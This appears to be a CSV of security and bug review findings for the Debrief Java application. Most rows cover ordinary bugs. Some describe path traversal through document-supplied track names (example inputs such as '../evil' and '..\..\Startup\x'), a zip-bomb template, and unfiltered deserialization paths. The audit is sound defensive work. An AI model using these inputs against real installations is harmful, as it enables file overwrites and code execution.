CR-054,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML,MWCXMLReader,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/MWCXMLReader.java,bug,thread-safety,Medium,Medium,candidate,Shared static SimpleDateFormat/DecimalFormat instances used without synchroni...,"_XMLDateFormat and RNdateFormat are lazily created static SimpleDateFormats (creation is synchronized but use is not): HandleDateTimeAttribute.setValue() calls getXMLDateFormatter().parse() and writeThis(Date)/writeThisInXML() call format() concurrently. DebriefFormatDateTime.toString() likewise uses static _df/_dfMillis unsynchronised (only parseThis is synchronized). Eclipse loads dropped files in parallel Jobs and autosave can run while an import is in progress, and SimpleDateFormat corrupts results silently under concurrent use.",L81; L143-L148; L199-L212; L289-L291; L322-L324,"Drag two .dpf files onto an open plot simultaneously, or save while a large import is running",Use java.time DateTimeFormatter (immutable) or ThreadLocal formatters; same for DebriefFormatDateTime._df/_dfMillis and MWCXMLReader shortFormat/longFormat.,S,Needs knowledge that SimpleDateFormat is not thread-safe plus the concurrent-job context; a grep finds the statics but not the unsynchronised use sites.,-,
CR-055,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML,MWCXMLReader,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/MWCXMLReader.java,algorithm-correctness,time-handling,Medium,High,candidate,DTG round-trips through a two-digit-year format,"writeThis(HiResDate) delegates to DebriefFormatDateTime.toStringHiRes(), which formats with 'yyMMdd HHmmss'; parseThis() reads it back with the same two-digit pattern, so SimpleDateFormat's sliding 80/20 window decides the century. Any dataset dated before ~1946 or after ~2046 (historical reconstructions, far-future exercise dates) is silently shifted by 100 years on save/load, and the shift point moves every year the software is run.",L214-L216; L309-L312,Save a plot containing a fix dated 1940-05-26 and reopen it: the fix loads as 2040-05-26,Write a four-digit year (yyyyMMdd) on export; parseThis already accepts it (spaceIndex > 6 branch).,S,Required tracing writeThis(HiResDate) into DebriefFormatDateTime and knowing SimpleDateFormat's yy window semantics.,-,
CR-056,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML.Util,ColourHandler,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/Util/ColourHandler.java,bug,string-parsing,Medium,High,candidate,Custom colour components unvalidated; out-of-range or non-numeric values abor...,"handleOurselves() parses CustomRed/Green/Blue with Integer.valueOf outside any try/catch, and elementClosed() calls new Color(_r,_g,_b), which throws IllegalArgumentException for values outside 0-255; either exception propagates out of the SAX callbacks and fails the whole file. _setColour compares against 'CUSTOM' while exportColour writes 'custom', so that branch is dead. fromString() has the same unguarded parseInt.",L96-L103; L141-L162; L164-L177; L180-L201,"<colour Value=""custom"" CustomRed=""300"" CustomGreen=""0"" CustomBlue=""0""/> in a track element","Clamp/validate components, catch NumberFormatException and fall back to a default colour with a warning.",S,grep-able for the parses; the Color range check needs API knowledge.,-,
CR-057,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML.Util,DurationHandler,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/Util/DurationHandler.java,bug,null-deref,Medium,High,candidate,Missing Units attribute causes NPE; unknown units silently become microseconds,"elementClosed() calls Duration.getUnitIndexFor(_units) where _units is null when the Units attribute is absent, throwing NPE (rethrown by MWCXMLReader.endElement and aborting the import). When Units is present but not one of the exact labels, getUnitIndexFor returns 0 (micros), so 'Hours' or 'hrs' silently loads a 2-hour duration as 2 microseconds. WorldSpeedHandler/BaseDataHandler have the identical pattern (index 0 = m/s).",L59-L71; L43-L57,"<Duration Value=""2"" Units=""Hours""/> in a .dpf planning segment, or <Duration Value=""2""/>",Default _units sensibly or reject the element; make unit lookup case-insensitive and fail on unknown labels.,S,Needs following the null into getUnitIndexFor and understanding the 0-index default.,WorldSpeedHandler L44-L54; BaseDataHandler L64-L69,
CR-058,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML.Util,LongLocationHandler,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/Util/LongLocationHandler.java,bug,string-parsing,Medium,High,candidate,longLocation attributes parsed with unguarded valueOf/charAt and lossy minute...,"Integer.valueOf/Float.valueOf/charAt(0) are called directly on attribute text with no try/catch and outside the base-class guard (handleOurselves is overridden), so a malformed or empty value throws NumberFormatException/StringIndexOutOfBounds through the SAX parser and aborts the whole import. In elementClosed() fractional minutes are only converted to seconds when _latSec == 0 (float equality), and the constructor is then given (int)_latMin, so 'LatMin=30.5 LatSec=10' silently drops the half minute.",L40-L52; L55-L86,"<longLocation LatDeg=""50"" LatMin=""30.5"" LatSec=""10"" LatHem="""" .../>","Wrap parsing in try/catch with a clear error, validate hemisphere length, and always add the fractional minutes to the seconds.",S,Needs reasoning about the float-equality branch and the (int) truncation together.,-,
CR-059,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML.Util,WorldDistanceHandler,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/Util/WorldDistanceHandler.java,bug,string-parsing,Medium,High,candidate,extractWorldDistance parses a double attribute with Integer.parseInt; unknown...,"exportDistance() writes Value with writeThisLong ('0.0000000'), but the DOM helper extractWorldDistance() reads it with Integer.parseInt, so every exported value throws NumberFormatException (used by ASSET LocationOffset). In the SAX path an unrecognised Units label is passed to WorldDistance.getUnitIndexFor(), which returns 0 (metres) for anything it does not recognise, so e.g. 'NM' or 'nmi' silently loads a nautical-mile distance as metres; a missing Value leaves -1.",L34-L47 (extract); L75-L87 (elementClosed),"Monte-Carlo template with <LocationOffset><WorldDistance Value=""1.0000000"" Units=""nm""/></LocationOffset>, or a hand-edited .dpf using Units=""NM""",Parse with readThisDouble; make getUnitIndexFor return -1/throw for unknown labels and treat that as an import error.,S,Needs cross-checking the export format against the import parse and the semantics of getUnitIndexFor.,ASSET.Util.MonteCarlo.LocationOffset L97,
CR-060,A1,org.mwc.debrief.core,org.mwc.debrief.core.loaders.xml_handlers,DebriefEclipseXMLReaderWriter,org.mwc.debrief.core/src/org/mwc/debrief/core/loaders/xml_handlers/DebriefEclipseXMLReaderWriter.java,bug,swallowed-exception,Medium,Medium,candidate,Save errors are logged but not reported; partially written .dpf looks like a ...,"exportThis()/outputContent() catch DOMException, ParserConfigurationException and TransformerException, log them and return normally. The Transformer may already have written part of the document to the OutputStream, so the plot file on disk is truncated/invalid while the caller (PlotEditor save) receives no exception and cannot mark the editor dirty or warn the user. The same pattern exists in the legacy DebriefXMLReaderWriter.",L46-L61; L72-L86; L94-L110,"Export of a layer whose exporter throws DOMException (e.g. an attribute value containing an illegal XML character), or a disk-full TransformerException mid-write","Rethrow as an unchecked/IO exception so the save operation fails visibly, and write to a temp file then rename.",S,Needs reasoning about partial output already flushed to the stream before the catch.,Debrief.ReaderWriter.XML.DebriefXMLReaderWriter L43-L111,
CR-061,A1,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.KML,ImportKML,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/KML/ImportKML.java,bug,locale-parsing,Medium,High,candidate,"KML bytes decoded with platform default charset, ignoring the XML encoding de...","inputStreamAsString() wraps the stream in InputStreamReader with no charset, so a UTF-8 KML (the KML standard) is decoded as cp1252 on Windows before being handed to the parser as a String; non-ASCII track names are corrupted and a UTF-8 BOM/degree sign may then be stripped by stripNonValidXMLCharacters. Track names for LineString data come from Date.toString() (default locale and timezone).",L162-L168; L306-L318; L346,UTF-8 KML with <name>Frégate-1</name> opened on a Windows machine with cp1252 default,"Pass the InputStream (or a byte array) directly to DocumentBuilder.parse so the parser honours the encoding declaration; if pre-filtering is required, decode as UTF-8 explicitly.",S,Needs knowing XML encoding detection is bypassed once the bytes are turned into a String.,-,
CR-062,A1+A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.KML,ImportKML,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/KML/ImportKML.java,bug,swallowed-exception,Medium,High,candidate,Import failures only printStackTrace; static mutable state shared across imports,"All caught exceptions (parser config, SAX, IO, ParseException) go to printStackTrace, so a malformed KML results in an empty or partial import with no user-visible message. lastLayer/colorCounter are static mutable fields written during import (and lastLayer is only cleared on the normal path), so two concurrent KML loads can append fixes to each other's tracks. LineString points are assigned fabricated timestamps at 1-second steps (DEFAULT_TIME_STEP) with nothing marking them as synthetic. || doZipImport() catches IOException (truncated/corrupt zip, wrong password, CRC error) and only printStackTrace()s; the loader completes as if successful and the plot is left unchanged with no user-visible message. The ZipInputStream is also never closed.",L60-L71; L84-L97; L256-L269; L329-L354; L300-L302,Truncated .kml file dropped onto a plot: nothing appears and no dialog is shown,Propagate a PlainImporter.ImportException so the loader shows the standard error dialog; make lastLayer/colorCounter locals or instance fields.,S,grep-able,-,
CR-063,A1,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.Tactical,FixHandler,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/Tactical/FixHandler.java,bug,null-deref,Medium,High,candidate,Fix with unparseable/missing Dtg or centre is added and crashes the import,"The Dtg handler catches ParseException and leaves _theFix.time null (parseThis also returns null for the NULL date string); elementClosed() still calls addPlottable(), and TrackSegment.addFixSilent -> FixWrapperCollisionCheck.correctTimeCollision dereferences getTime().getMicros(), so one bad fix aborts the whole plot with 'Parse Error: null'. A fix without a centre element likewise NPEs in TrackWrapper.addFix when extending _myWorldArea. Course wrap at L141-L144 also only adds 360 once.",L136-L149; L164-L173; L176-L181; L239-L246,"<fix Dtg=""garbage"" Course=""0"" Speed=""0""><centre><shortLocation Lat=""1"" Long=""1"" Depth=""0""/></centre></fix>",In elementClosed() skip (and report) fixes whose time or location is null rather than adding them.,S,"Needed to trace the null across FixHandler, TrackSegment and FixWrapperCollisionCheck.",-,
CR-064,A1,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.extensions,TimeSeriesDoubleHandler,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/extensions/TimeSeriesDoubleHandler.java,bug,silent-data-loss,Medium,High,candidate,Index and value lists desynchronise when one measurement attribute fails to p...,"Each Item element appends Index to _indices and Value to _values independently; Long.parseLong/Double.parseDouble exceptions are swallowed by MWCXMLReader.handleOurselves, so a single bad Value leaves _indices one longer than _values and every subsequent measurement is silently attributed to the wrong time. TimeSeries2DoubleHandler has the same structure with two value lists.",L37-L55,"<Item Index=""1000"" Value=""n/a""/> followed by valid items in a MeasuredData dataset",Parse both attributes into locals in handleOurselves and add the pair atomically (or skip the item) when both parse.,S,Requires understanding the swallowing in the base class combined with two parallel lists.,TimeSeries2DoubleHandler L41-L58,
CR-065,A2+A10,org.mwc.debrief.core,org.mwc.debrief.core.operations,ExportDopplerShift,org.mwc.debrief.core/src/org/mwc/debrief/core/operations/ExportDopplerShift.java,security,path-traversal,Medium,High,candidate,Output filename built from unsanitised primary track name,"Same pattern as ExportToFlatFile: fileName = filePath + separator + primaryTrack.getName() + '_' + HOST_DATE + suffix, with the document-supplied track name unsanitised, allowing writes outside the chosen directory and silent failure on illegal characters. || fileName = filePath + separator + primaryTrack.getName() + '_' + date + '.csv'. The track name comes from the loaded .rep/.dpf and may contain path separators or '..', so the export writes outside the directory the analyst chose; filePath is also left null when the wizard page is incomplete, producing a relative 'null/...' path. ExportToFlatFile L208-L211 has the same construction.",L112-L116; L93; L106-L120,Track named '../evil' selected as primary when exporting Doppler shift.,Share one sanitise-and-confine helper with ExportToFlatFile.,S,grep-able,ExportToFlatFile.java L208-L211,
CR-066,A2,org.mwc.debrief.core,org.mwc.debrief.core.operations,ExportToFlatFile,org.mwc.debrief.core/src/org/mwc/debrief/core/operations/ExportToFlatFile.java,security,path-traversal,Medium,High,candidate,Output filename built from unsanitised primary track name,"The SAM flat-file export writes to filePath + separator + primaryTrack.getName() + '_' + date. The track name comes from the loaded data file (.rep/.dpf) and is not sanitised, so a name containing path separators or '..' writes outside the folder the user chose (path traversal on save), and names with characters illegal on Windows (':' '?' '*') make the export fail with only a log entry after a success-looking wizard.",L208-L215,Load a .rep whose track name is '..\..\Startup\x' (quoted token) and run Export to flat file.,Sanitise the name (replace [^A-Za-z0-9._-]) and verify the resulting File's canonical parent equals the chosen folder before writing.,S,grep-able once you know track names are document-controlled; needed the data-flow to rate it.,-,
CR-067,A2,org.mwc.debrief.legacy,-,MANIFEST.MF,org.mwc.debrief.legacy/META-INF/MANIFEST.MF,supply-chain,outdated-dependency,Medium,High,candidate,"zip4j 1.3.2, pdfbox 2.0.3 and jsoup 1.11.3 bundled with known DoS/Zip-Slip fi...","libs/zip4j-1.3.2.jar predates the Zip Slip path-traversal fix (1.3.3, 2018) and is used to extract user-chosen pptx templates. libs/pdfbox-2.0.3.jar is fed untrusted PDFs by PdfLoader/ImportNarrativeDocument.importFromPdf and lacks fixes for CVE-2018-11797 (page-tree DoS, 2.0.12), CVE-2019-0228 (XXE in XMP, 2.0.15), CVE-2021-27807/27906 and CVE-2021-31811/31812 (infinite loops/OOM, 2.0.23-2.0.24). libs/jsoup-1.11.3.jar lacks the CVE-2021-37714 infinite-loop fix (1.14.2) and parses template XML.",MANIFEST.MF L17 (zip4j); libs/pdfbox-2.0.3.jar; libs/jsoup-1.11.3.jar,Crafted PDF opened via the PDF narrative loader; crafted pptx template.,"Bump pdfbox to 2.0.30+, jsoup to 1.15+, zip4j to 2.11+ (adapt UnpackFunction/PackPresentation to the 2.x API).",M,grep-able,CVE-2018-11797; CVE-2019-0228; CVE-2021-27807; CVE-2021-27906; CVE-2021-31811; CVE-2021-31812; CVE-2021-37714,
CR-068,A2+A3,org.mwc.debrief.legacy,Debrief.ReaderWriter.GeoPDF,AbstractGeoPDFBuilder,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/GeoPDF/AbstractGeoPDFBuilder.java,bug,api-misuse,Medium,Medium,candidate,process.waitFor() called before draining gdal stdout/stderr (pipe deadlock),"createBackgroundFile() and generatePDF() call runtime.exec() then process.waitFor() and only afterwards read stdout and stderr. If gdalwarp/gdal_create writes more than the OS pipe buffer (typically 64 KB on Windows, e.g. verbose warnings for a large or malformed GeoTIFF background) the child blocks on write, waitFor() never returns and the GeoPDF export hangs the UI thread indefinitely. || generatePDF calls runtime.exec(...) then process.waitFor() at L576 and only afterwards opens and drains stdout and stderr (L577-L595). If gdal_create emits more than the pipe buffer (typically 64 KB) of warnings, the child blocks on write and waitFor never returns, hanging the export. In addition any non-empty stdout is treated as an error (L588-L590), so informational output aborts the export.",L434-L441; L574-L581; L574-L600,GeoPDF export with a background raster that makes gdalwarp emit many warnings (or with CPL_DEBUG set).,Use ProcessBuilder.redirectErrorStream(true) and consume the output stream in a loop (or a thread) before/while waiting; add a timeout.,S,Requires knowing the Process pipe-buffer semantics; not a grep pattern.,-,
CR-069,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.Word,ImportRiderNarrativeDocument,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportRiderNarrativeDocument.java,bug,null-deref,Medium,High,candidate,handleImportX swallows XWPFDocument open failure then dereferences null doc,"handleImportX() catches IOException from new XWPFDocument(inputStream) (L1123-L1126) and continues to doc.getTables() (L1129) with doc==null, throwing NPE. Non-IOException failures (POIXMLException/NotOfficeXmlFileException for a .docx that is really OLE2 or not a zip) are not caught at all. Either way the user sees a generic 'Problem loading' log entry and no explanation.",L1118-L1140,Rename a .doc (OLE2) or a text file to .docx and open it; or a truncated .docx.,"Return early (with a logged, user-visible message) when doc==null and catch POI runtime exceptions around the constructor; mirror the .doc-in-.docx fallback that handleImport has for the opposite case.",S,grep-able,-,
CR-070,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.Word,ImportRiderNarrativeDocument,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportRiderNarrativeDocument.java,bug,resource-leak,Medium,High,candidate,Word documents and fallback FileInputStream never closed,"handleImport() never closes the HWPFDocument (L1086), and on the .docx-in-.doc fallback opens a second FileInputStream is2 (L1091) that is never closed; handleImportX() never closes the XWPFDocument in the rider branch (L1123/L1132-L1134) - only ImportNarrativeDocument.importFromWordX() closes it in the other branch. XWPFDocument holds an open ZipFile on the source, so the imported file stays locked on Windows for the workbench lifetime and handles leak per import.",L1083-L1099; L1120-L1134,Import a rider narrative .docx then try to overwrite or delete it in Explorer while Debrief is running.,Use try-with-resources for the documents and is2; close in finally.,S,grep-able,-,
CR-071,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,PlotTracks,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/PlotTracks.java,bug,logic-error,Medium,Medium,candidate,Slide XML read/written with platform default charset (charset mismatch),"Slide and presentation XML are decoded with new String(bytes) (default charset) and written back with FileWriter (default charset) although the parts are UTF-8. On Windows (cp1252 default in Java 11) template bytes undefined in cp1252 (0x81,0x8D,0x8F,0x90,0x9D) become U+FFFD and any non-ASCII narrative text or track name is emitted as cp1252 bytes inside a UTF-8 declared part, producing a PPTX PowerPoint flags as corrupt/repairable or with mojibake.",L241; L807; L825; L850-L852; ParsePresentation.java L31; FindMap.java L51,"Export on Windows with a narrative entry containing 'é' or '°', or a template whose slide XML contains curly quotes.","Use new String(bytes, StandardCharsets.UTF_8) and Files.newBufferedWriter(path, UTF_8) (or Jsoup's charset-aware output).",S,Needed to connect the read and write sides and the OOXML UTF-8 contract; a lint would flag default-charset use but not the resulting file corruption.,-,
CR-072,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,PlotTracks,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/PlotTracks.java,bug,degenerate-input,Medium,High,candidate,Export with zero recorded tracks throws IndexOutOfBounds out of the export path,"createTimeNarrativeShapes() does trackData.getTracks().get(0) (L542) and the per-track loop does coordinates.get(0) (L395). CoreCoordinateRecorder.exportFile() catches only IOException/ZipException/DebriefException, so a recording session where no track was visible ends in an uncaught RuntimeException from stopStepping() after the user completed the dialog.",L395-L396; L542,"Start PPTX recording with all tracks hidden (or a plot with only shapes), step the time, stop and confirm the export dialog.","Validate trackData (at least one track with at least one point) before unpacking, and report via DebriefException.",S,grep-able,-,
CR-073,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,PlotTracks,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/PlotTracks.java,bug,null-deref,Medium,High,candidate,validateDonorFile/export do not guard against templates missing expected shapes,"validateDonorFile catches DebriefException/IOException/ZipException only, but the checks it runs throw unchecked exceptions first: FindMap.getSlides() NPEs when ppt/slides is absent (listFiles()==null), FindMap.checkForMap() and getMapDimesions() IOOBE/NumberFormatException when the 'map' shape lacks a|off/a|ext, findTimeAnimationObjects() NPEs when no p|spTgt targets the 'time' shape (time_anim_tag_big null at L672), findAnimationTagObjects() NPEs without p|animMotion. retrieveMapProperties() NPEs at L756 when no map shape exists. These escape into the SWT dialog (okPressed) and the preference page.",L664-L674; L648-L654; L729-L732; L751-L758; L776-L840; FindMap.java L292; L254-L257,"A pptx with one slide but no shape named 'map', or without any animation timing, chosen as master template.",Catch RuntimeException in validateDonorFile and return a message; null-check every selectFirst/get(0) result and convert to DebriefException.,S,Needed reading of the parent().parent() chains and the catch list to see which failures escape.,-,
CR-074,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,UnpackFunction,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/UnpackFunction.java,security,zip-bomb,Medium,High,candidate,extractAll of template has no size or entry-count limit,"The whole archive is inflated to disk with no check on uncompressed size, entry count or compression ratio. A small pptx with a multi-GB zero-filled slide part fills the temp volume and stalls the export/validation. validateDonorFile is invoked synchronously in the UI thread from ExportPPTDialog.okPressed().",L67-L68,"A 100 KB .pptx whose ppt/media/x.bin inflates to tens of GB (deflate ratio ~1000:1), set as master template.","Iterate file headers, sum getUncompressedSize(), refuse archives over a fixed budget (e.g. 200 MB) or with more than a few thousand entries before extracting.",S,grep-able (extractAll without bounds) but impact needed the call-site/UI-thread context.,-,
CR-075,A3,org.mwc.asset.legacy,ASSET.Util.jip.rmi,RMIDiscovery,org.mwc.asset.legacy/src/ASSET/Util/jip/rmi/RMIDiscovery.java,security,unsafe-deserialization,Medium,High,candidate,Unauthenticated ServerSocket deserializes first inbound connection (double re...,"startListener binds a ServerSocket on all interfaces in a configurable port range (L252-L254), accepts one connection from anyone (L269), wraps it in an unfiltered ObjectInputStream, readObject()s a MarshalledObject and then calls mo.get() which deserializes a second attacker-controlled payload (L270-L273). The result is stored as the RMI service reference without checking it implements _serviceInterface. No callers of RMIDiscovery/RMILookup exist in the repository, so this is dead code, but it is shipped in the ASSET bundle. RuntimeExceptions from readObject also escape the thread (only IOException/ClassNotFoundException are caught, L277-L280).",L252-L261; L269-L273; L277-L281,"While lookup() is running, an attacker on the LAN connects to the advertised port and sends a serialized gadget/SerialDOS stream (the multicast request at L302 even tells them the port).","Remove the jip RMI discovery package, or if kept, apply ObjectInputFilter, verify the returned Remote is an instance of _serviceInterface, and bind to loopback or authenticate peers.",S,Grep finds ObjectInputStream but the double-deserialization via MarshalledObject.get and the accept-from-anyone design need reading.,-,
CR-076,A3+A4,org.mwc.cmap.core,-,xstream-1.4.12.jar,org.mwc.cmap.core/libs/xstream-1.4.12.jar,supply-chain,vulnerable-dependency,Medium,High,candidate,"XStream 1.4.12 bundled and exported; many RCE/DoS CVEs, no default type allow...","org.mwc.cmap.core ships and exports com.thoughtworks.xstream 1.4.12 (MANIFEST.MF L8, L52-L67). Versions before 1.4.18 have no default security framework and 1.4.12 is affected by CVE-2020-26217 (RCE), CVE-2020-26258 (SSRF), CVE-2020-26259 (file deletion), CVE-2021-21341..21351 and CVE-2021-29505 (RCE/DoS), CVE-2021-39139..39154 and CVE-2022-41966 (DoS). The only consumer (XYPlotView.restorePreviousPlot) deserializes strings from the workbench memento with fromXML and no allowlist. || xstream-1.4.12 is affected by 33 OSV advisories including remote code execution via crafted XML (CVE-2020-26217, CVE-2021-21344..21351, CVE-2021-29505, CVE-2021-39139..39154, CVE-2022-41966, CVE-2024-47072). XYPlotView.restorePreviousPlot creates new XStream(new DomDriver()) at L1112 with no allowTypes/security framework and calls fromXML on strings taken from the Eclipse view memento (L1119, L1128, L1150-L1174). The memento lives in the workspace .metadata/.plugins/org.eclipse.e4.workbench/workbench.xml, so exploitation requires a poisoned workspace or shared .metadata rather than a data file, which caps severity at Medium.","MANIFEST.MF L8; L52-L67; org.mwc.cmap.core/META-INF/MANIFEST.MF L8; org.mwc.cmap.xyplot/src/org/mwc/cmap/xyplot/views/XYPlotView.java L1112-L1128, L1150-L1174",Any XStream.fromXML on attacker-influenced XML; today that is workbench.xml/memento content in the workspace .metadata folder.,"Upgrade to XStream 1.4.21+ and configure xs.allowTypes/allowTypesByWildcard for the few JFreeChart/Debrief classes needed, or replace the memento serialization with plain strings.",M,"grep-able (jar version), but exploitability assessment required locating the single consumer.",CVE-2020-26217; CVE-2021-29505; CVE-2021-39139; CVE-2022-41966; CVE-2021-39144; CVE-2024-47072,
CR-077,A3,org.mwc.cmap.legacy,MWC.GUI.Tools.Operations,RightClickPasteAdaptor,org.mwc.cmap.legacy/src/MWC/GUI/Tools/Operations/RightClickPasteAdaptor.java,security,unsafe-deserialization,Medium,Medium,candidate,AWT clipboard Plottable flavor deserialized before checking Transferable origin,"createMenu asks the AWT clipboard for PlottableSelection.PlottableFlavor (a DataFlavor built from the Plottable class, i.e. application/x-java-serialized-object, PlottableSelection L77) and calls tr.getTransferData at L256 BEFORE the `tr instanceof PlottableSelection` check at L260. For a Transferable proxy coming from another process AWT's DataTransferer reconstructs the object with ObjectInputStream, so foreign clipboard bytes are deserialized on every right-click on a Layer. Debrief Lite's OutlinePanelView does this correctly (instanceof check at L866 before getTransferData L870).",L247-L256; L260,Another process publishes clipboard data under the application/x-java-serialized-object;class=MWC.GUI.Plottable flavor; analyst right-clicks a layer in the legacy Swing outline.,Move the `tr instanceof PlottableSelection` test before getTransferData (as OutlinePanelView does) so only in-process Transferables are unwrapped.,S,Requires knowing AWT deserializes serialized-object flavors for foreign Transferables and noticing the ordering of the instanceof check.,-,
CR-078,A3,org.mwc.debrief.dis,edu.nps.moves.disutil,PduFactory,org.mwc.debrief.dis/src/edu/nps/moves/disutil/PduFactory.java,bug,swallowed-exception,Medium,High,candidate,Truncated/malformed PDUs are returned half-initialised because unmarshal swal...,"createPdu(byte[]) calls aPdu.unmarshal(dis) and returns aPdu unconditionally (L116-L237). Every edu.nps.moves.dis unmarshal() (e.g. EntityStatePdu L570-L596, DataPdu L237-L260, VariableDatum) wraps parsing in `catch (Exception e) { System.out.println(e); }`, so an EOFException from a short datagram leaves fields at their defaults (location 0,0,0, timestamp 0, empty lists) and the PDU is still dispatched to fix/event listeners as valid data. createPdu also ignores DatagramPacket.getLength() and pduLength (Pdu.unmarshal L370) so trailing buffer bytes are parsed as payload. The ByteBuffer variant at L257 indexes PduType.lookup without the bounds guard used at L97-L101 (unused in Debrief).",L85-L237; L247-L260,"A 20-byte datagram with PDU type 1 (EntityState): a fix at lat/lon 0,0 time 0 is added to the live plot.",Have unmarshal propagate a checked exception (or return false) and drop PDUs that fail to parse; pass packet.getLength() into the DataInputStream and validate pduLength against it.,M,Needs understanding of how generated open-dis code and the factory interact; a grep for empty catch blocks finds thousands of hits.,-,
CR-079,A3,org.mwc.debrief.dis,org.mwc.debrief.dis.runner,SimulationRunner,org.mwc.debrief.dis/src/org/mwc/debrief/dis/runner/SimulationRunner.java,bug,api-misuse,Medium,High,candidate,Child simulator stderr never drained; output pump drops lines and spins,"run() launches the external simulator (L55) but only reads stdout (L57); nothing consumes getErrorStream(), so a simulator writing more than the OS pipe buffer to stderr blocks forever. The pump thread (L59-L92) reads one line, then tests exitValue() and terminates as soon as the process has exited, discarding any remaining buffered stdout lines; if the child closes stdout while still running, readLine() returns null immediately and the loop busy-spins at 100% CPU. stop() nulls oThread without signalling _terminated (L106-L117).",L55-L92; L106-L117,"Configure a simulator script that prints a long stack trace to stderr, or one that closes stdout and keeps running.","Use ProcessBuilder.redirectErrorStream(true), loop `while ((line = readLine()) != null)` (EOF is the termination signal), and make _terminated volatile/set it in stop().",S,"Standard Process-handling pitfalls, but the line-dropping and spin behaviour require reading the loop logic.",-,
CR-080,A3,org.mwc.debrief.legacy,Debrief.Tools.Operations,OpenPlot,org.mwc.debrief.legacy/src/Debrief/Tools/Operations/OpenPlot.java,security,unsafe-deserialization,Medium,High,candidate,.dpl plot files are loaded via unfiltered Java serialization,"OpenPlotAction.execute opens the user-selected *.dpl file with a raw ObjectInputStream and calls readObject() (L66-L71) with no ObjectInputFilter; the Session cast happens only after the whole graph has been reconstructed, so any Serializable class reachable from the legacy bundle (and the whole flat classpath in Debrief Lite) is instantiated with attacker data. Reachability caveat: the only reference to OpenPlot outside its own file is a commented-out block in Application.java L503-L508, so this tool is dead code in the shipped RCP/Lite products; it remains a live class that would become Critical if re-wired.",L61-L71,A crafted plot.dpl containing a deeply nested HashSet graph (SerialDOS) or a gadget chain for any bundled library; user chooses File > Open Plot in the legacy Swing app.,"Delete OpenPlot/SavePlotAs and the .dpl format, or add a strict ObjectInputFilter allowlisting Debrief/MWC session classes with depth/size limits.",S,"Severity depends on establishing that the code path is unreachable from the RCP product, which required tracing callers.",-,
CR-081,A4,org.mwc.cmap.geotools,-,gt-main-21.2.jar,org.mwc.cmap.geotools/libs/gt-main-21.2.jar,supply-chain,outdated-dependency,Medium,High,candidate,"GeoTools 21.2 (2019, EOL) + 100 transitive jars incl. vulnerable h2/hsqldb","The whole org.mwc.cmap.geotools/libs tree (gt-*-21.2, gt-swt-23-SNAPSHOT, 34 jt-* JAI-tools jars, JAI 1.1.3 from 2006) is hand-vendored and unmaintained; GeoTools is now on 33.x with Java 17+ and jakarta.* moves, which #5237 must absorb. Bundled transitive jars carry confirmed CVEs even though Debrief code only touches shapefile/geotiff/referencing/render (NaturalearthUtil, NELayer, WorldImageLayer): gt-jdbc-21.2 CVE-2023-25158 (SQL injection via filter encoding), h2-1.4.200 CVE-2021-42392 / CVE-2022-23221 (JNDI RCE via JDBC URL; no Debrief code opens an H2 URL), hsqldb-2.2.8 CVE-2022-41853 (used only by gt-epsg-hsql against the bundled EPSG DB), commons-text-1.6 CVE-2022-42889 (StringSubstitutor not invoked), jdom2-2.0.6 CVE-2021-33813, guava-27.0 CVE-2023-2976, jackson-core-2.9.9 CVE-2025-52999, commons-io-2.6 CVE-2021-29425/CVE-2024-47554. None of these paths is reached by untrusted input today, so this is an outdated-dependency row rather than a vulnerable one.",org.mwc.cmap.geotools/META-INF/MANIFEST.MF L10-L140 (Bundle-ClassPath); org.mwc.cmap.geotools/build.properties; org.mwc.cmap.NaturalEarth/src/org/mwc/cmap/naturalearth/wrapper/NELayer.java; org.mwc.cmap.geotools/src/org/mwc/cmap/geotools/gt2plot/WorldImageLayer.java,N/A for current code paths; any future use of gt-jdbc/H2 or shapefile attribute filters from user input would become exploitable.,"Move the plugin to a Tycho pomDependencies=consider / target-platform Maven location so GeoTools and its transitive set are resolved from Maven Central (33.x) and Dependabot can track them; drop gt-jdbc, gt-jdbc-h2, h2 and hsqldb if unused.",L,Needed to check each transitive CVE against actual Debrief usage to avoid a false High.,CVE-2023-25158; CVE-2021-42392; CVE-2022-23221; CVE-2022-41853; CVE-2022-42889; CVE-2021-33813; CVE-2023-2976; CVE-2025-52999; #5237,
